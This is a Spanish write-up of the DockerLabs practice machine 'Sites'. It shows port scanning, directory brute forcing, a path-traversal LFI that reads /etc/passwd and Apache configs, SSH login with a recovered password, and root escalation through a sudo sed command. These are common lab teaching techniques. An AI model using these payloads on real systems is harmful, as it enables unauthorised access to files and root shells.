# 🖥️ Writeup - Sites 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip sites.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh sites.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 14:48 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 cb:8f:50:db:6d:d8:d4:ac:bf:54:b0:62:12:7c:f0:01 (ECDSA)
|_  256 ca:6b:c7:0c:2a:d6:0e:3e:ff:c4:6e:61:ac:35:db:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Configuraci\xC3\xB3n de Apache y Seguridad en Sitios Web
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```

En el puerto `80` encontramos una página que hace referencia a un `LFI` a partir de un archivo `.php`.

Procedemos a buscar directorios y archivos ocultos. 

# GOBUSTER

```bash 
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,bak,sh,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 3591]
/vulnerable.php       (Status: 200) [Size: 37]
Progress: 1543899 / 1543899 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos un archivo `.php` llamado `vulnerable.php`.

Al acceder a él a través del navegador aparece un mensaje

```
Please provide a page or a username. 
```

Esto nos hace pensar que, si pasamos el parámetro page en el archivo `.php`, podremos apuntar a otros archivos del sistema, como por ejemplo `/etc/passwd`.

# LFI

```
http://172.17.0.2/vulnerable.php?page=../../../../etc/passwd
```

Info:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
chocolate:x:1001:1001:,,,:/home/chocolate:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Efectivamente, se ha dumpeado todo el contenido del archivo `/etc/passwd`, donde podemos ver que existe un usuario llamado `chocolate`.

Intentamos fuerza bruta con `Hydra`, pero no obtenemos resultados, por lo que seguramente debamos aprovechar el `LFI` para obtener más información.

Probamos a visualizar más archivos comprometidos.

```
http://172.17.0.2/vulnerable.php?page=../../../../etc/apache2/sites-available/sitio.conf
```

Info:
```
<VirtualHost *:80>
    ServerAdmin webmaster@tusitio.com
    DocumentRoot /var/www/html
    ServerName sitio.dl
    ServerAlias www.sitio.dl

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin)
    # <Files "archivitotraviesito">
    #   Require all denied
    # </Files>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

Con esta información intuimos que en la ruta `/var/www/html` hay un archivo llamado `archivitotraviesito`, que resulta bastante interesante.


```
http://172.17.0.2/vulnerable.php?page=../../../../var/www/html/archivitotraviesito
```

Info:
```
Muy buen, has entendido el funcionamiento de un LFI y los archivos interesantes a visualizar dentro de apache, ahora te proporciono el acceso por SSH, pero solo la password, para practicar un poco de bruteforce (para variar) lapasswordmasmolonadelacity 
```

Lo comprobamos y encontramos la contraseña del usuario `chocolate` : `lapasswordmasmolonadelacity`.

Accedemos por SSH.

```bash 
ssh chocolate@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

```bash 
sudo -l
```
Info:
```
Matching Defaults entries for chocolate on 3bd7f67fdd5b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User chocolate may run the following commands on 3bd7f67fdd5b:
    (ALL) NOPASSWD: /usr/bin/sed
```

Observamos que el usuario `chocolate` puede ejecutar el binario `sed` con privilegios de cualquier usuario del sistema, en este caso únicamente como `root`.

Esto significa que, con el siguiente comando, deberíamos obtener una shell como `root`.

```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

Info:
```
# whoami
root
#
```

Ya somos root!